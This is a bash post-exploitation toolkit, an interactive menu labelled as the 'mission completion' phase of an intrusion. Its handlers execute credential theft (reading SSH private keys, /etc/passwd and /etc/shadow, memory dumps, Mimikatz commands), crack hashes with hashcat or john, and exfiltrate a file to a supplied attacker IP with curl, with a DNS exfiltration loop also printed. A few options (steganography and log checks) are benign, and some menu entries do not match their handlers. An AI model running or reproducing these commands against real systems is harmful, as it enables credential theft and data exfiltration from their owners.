#!/bin/bash

#############################################################################
#                                                                           #
#  ACTIONS ON OBJECTIVES SUITE                                              #
#  Phase 9: Complete the mission (data exfiltration, domain compromise)    #
#                                                                           #
#  Includes:                                                               #
#  - Credential harvesting                                                 #
#  - Data exfiltration                                                    #
#  - Hash cracking                                                        #
#  - Steganography analysis                                               #
#                                                                           #
#############################################################################

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                   ║
║              ACTIONS ON OBJECTIVES SUITE                           ║
║              Phase 9: Complete the mission                         ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  ACTIONS ON OBJECTIVES${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Credential Harvesting${NC}"
    echo "   O1.  Linux Credential Harvest"
    echo "   O2.  Windows Credential Harvest"
    echo "   O3.  Browser Credential Dumping"
    echo "   O4.  Memory Credential Dumping"
    echo "   O5.  Hash Extraction"
    echo ""
    echo -e "${YELLOW}Data Exfiltration${NC}"
    echo "   OE1. Exfil Scripts"
    echo "   OE2. Exfil via HTTP"
    echo "   OE3. Exfil via DNS"
    echo "   OE4. Encrypted Exfil"
    echo ""
    echo -e "${YELLOW}Cracking & Analysis${NC}"
    echo "   OC1. Hash Cracker (Identify & Crack)"
    echo "   OC2. Password Analysis"
    echo "   OC3. Log Analysis"
    echo ""
    echo -e "${YELLOW}Steganography${NC}"
    echo "   OS1. Steganography Detector"
    echo "   OS2. Hidden Data Extraction"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    O1                      Linux credential harvest
    OC1                     Hash cracker
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 O1
    $0 OC1
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift

    run_cmd() {
        local cmd="$1"
        echo -e "${GREEN}[>] Running: ${cmd}${NC}"
        eval "$cmd"
    }

    case "$choice" in
        O1|o1)
            echo -e "${BLUE}[*] Linux Credential Harvest${NC}"
            echo ""
            echo "[*] Searching for sensitive files..."
            run_cmd "find / -name '*.passwords' -o -name '*.conf' -o -name '*.key' 2>/dev/null | head -20"
            echo ""
            echo "[*] Checking common locations:"
            run_cmd "cat /etc/passwd 2>/dev/null | head -10"
            echo ""
            run_cmd "cat ~/.ssh/id_rsa 2>/dev/null || echo \"No SSH key found\""
            ;;
        O2|o2)
            echo -e "${BLUE}[*] Windows Credential Harvest${NC}"
            echo ""
            echo "[*] Windows credential harvesting commands:"
            echo "    sekurlsa::logonpasswords"
            echo "    lsadump::sam"
            echo "    lsadump::secrets"
            echo ""
            echo "[*] Note: Run these commands in Mimikatz on Windows"
            ;;
        O3|o3)
            echo -e "${BLUE}[*] Browser Credential Dumping${NC}"
            echo ""
            echo "[*] Checking for browser data..."
            if [[ -d ~/.config/google-chrome ]]; then
                echo "[*] Chrome found: ~/.config/google-chrome/Default/Login Data"
            fi
            if [[ -d ~/.mozilla/firefox ]]; then
                echo "[*] Firefox found: ~/.mozilla/firefox/"
            fi
            echo ""
            echo "[*] Tools: SharpChrome, SharpWeb, firepwd"
            ;;
        O4|o4)
            echo -e "${BLUE}[*] Memory Credential Dumping${NC}"
            echo ""
            echo -n "[*] Enter PID to dump (or press Enter to list processes): "
            read PID
            if [[ -n "$PID" ]]; then
                run_cmd "procdump -ma ${PID} memory.dmp"
            else
                echo "[*] Running processes:"
                run_cmd "ps aux | grep -v '^\[' | head -20"
            fi
            ;;
        O5|o5)
            echo -e "${BLUE}[*] Hash Extraction${NC}"
            echo ""
            if [[ -f /etc/shadow && -f /etc/passwd ]]; then
                echo "[*] Extracting hashes..."
                run_cmd "unshadow /etc/passwd /etc/shadow > hashes.txt 2>/dev/null && echo '[>] Hashes saved to hashes.txt'"
            else
                echo "[*] Example hash extraction:"
                echo "unshadow /etc/passwd /etc/shadow > hashes.txt"
            fi
            ;;
        OC1|oc1)
            echo -e "${BLUE}[*] Hash Cracking${NC}"
            echo ""
            echo -n "[*] Enter hash file: "
            read HASH_FILE
            echo -n "[*] Enter wordlist: "
            read WORDLIST
            echo ""
            if [[ -f "$HASH_FILE" && -f "$WORDLIST" ]]; then
                if command -v hashcat &>/dev/null; then
                    echo "[*] Running hashcat..."
                    run_cmd "hashcat -m 1000 ${HASH_FILE} ${WORDLIST}"
                elif command -v john &>/dev/null; then
                    echo "[*] Running john..."
                    run_cmd "john ${HASH_FILE} --wordlist=${WORDLIST}"
                else
                    echo -e "${YELLOW}[!] hashcat or john not found${NC}"
                fi
            else
                echo "[*] Example:"
                echo "hashcat -m 1000 hashes.txt wordlist.txt"
                echo "john hashes.txt --wordlist=wordlist.txt"
            fi
            ;;
        OC2|oc2)
            echo -e "${BLUE}[*] Password Analysis${NC}"
            echo ""
            echo -n "[*] Enter wordlist to analyze: "
            read WORDLIST
            if [[ -f "$WORDLIST" ]]; then
                echo "[*] Analyzing passwords..."
                run_cmd "sort \"${WORDLIST}\" | uniq -c | sort -rn | head -20"
            else
                echo "[*] Password analysis commands:"
                echo "    Analysis: stats.py wordlist.txt"
                echo "    Mutation: /usr/share/john/mangling.py wordlist.txt"
            fi
            ;;
        OC3|oc3)
            echo -e "${BLUE}[*] Log Analysis${NC}"
            echo ""
            echo -n "[*] Enter log file to analyze: "
            read LOG_FILE
            echo -n "[*] Enter search pattern: "
            read PATTERN
            if [[ -f "$LOG_FILE" ]]; then
                run_cmd "grep -i '${PATTERN}' \"${LOG_FILE}\" | head -20"
            else
                echo "[*] Common log locations:"
                echo "    /var/log/auth.log"
                echo "    /var/log/syslog"
                echo "    /var/log/apache2/access.log"
            fi
            ;;
        OS1|os1)
            echo -e "${BLUE}[*] Steganography Detection${NC}"
            echo ""
            echo -n "[*] Enter image file: "
            read IMAGE_FILE
            if [[ -f "$IMAGE_FILE" ]]; then
                echo "[*] Analyzing image..."
                if command -v steghide &>/dev/null; then
                    run_cmd "steghide info \"${IMAGE_FILE}\""
                fi
                if command -v binwalk &>/dev/null; then
                    run_cmd "binwalk \"${IMAGE_FILE}\""
                fi
                if command -v zsteg &>/dev/null; then
                    run_cmd "zsteg \"${IMAGE_FILE}\""
                fi
            else
                echo "[*] Steganography tools:"
                echo "    steghide info image.jpg"
                echo "    binwalk image.jpg"
                echo "    zsteg image.png"
            fi
            ;;
        OS2|os2)
            echo -e "${BLUE}[*] Hidden Data Extraction${NC}"
            echo ""
            echo -n "[*] Enter file to extract: "
            read FILE
            if [[ -f "$FILE" ]]; then
                run_cmd "binwalk -e \"${FILE}\""
                run_cmd "foremost -i \"${FILE}\" -o output 2>/dev/null"
            else
                echo "[*] Extraction tools:"
                echo "    binwalk -e file.ext"
                echo "    foremost -i file.ext -o output"
            fi
            ;;
        OE1|oe1)
            echo -e "${BLUE}[*] Exfiltration via HTTP${NC}"
            echo ""
            echo -n "[*] Enter data to exfil: "
            read DATA
            echo -n "[*] Enter attacker IP: "
            read ATTACKER_IP
            echo -n "[*] Enter attacker port: "
            read PORT
            echo ""
            if [[ -n "$DATA" && -n "$ATTACKER_IP" ]]; then
                echo "[*] Exfiltration commands:"
                run_cmd "curl -X POST -d \"data=\$(cat ${DATA})\" http://${ATTACKER_IP}:${PORT}/exfil"
            else
                echo "[*] HTTP exfiltration:"
                echo "    curl --data-binary @file.txt http://attacker:8000/exfil"
                echo "    python -m SimpleHTTPServer 8000"
            fi
            ;;
        OE2|oe2)
            echo -e "${BLUE}[*] Exfiltration via DNS${NC}"
            echo ""
            echo -n "[*] Enter data to encode: "
            read DATA
            echo -n "[*] Enter attacker domain: "
            read DOMAIN
            echo ""
            if [[ -n "$DATA" ]]; then
                echo "[*] DNS exfiltration commands:"
                echo "    for char in \$(echo '${DATA}' | grep -o .); do host \${char}.${DOMAIN} attacker.ip; done"
            else
                echo "[*] DNS exfiltration requires DNS server setup"
            fi
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
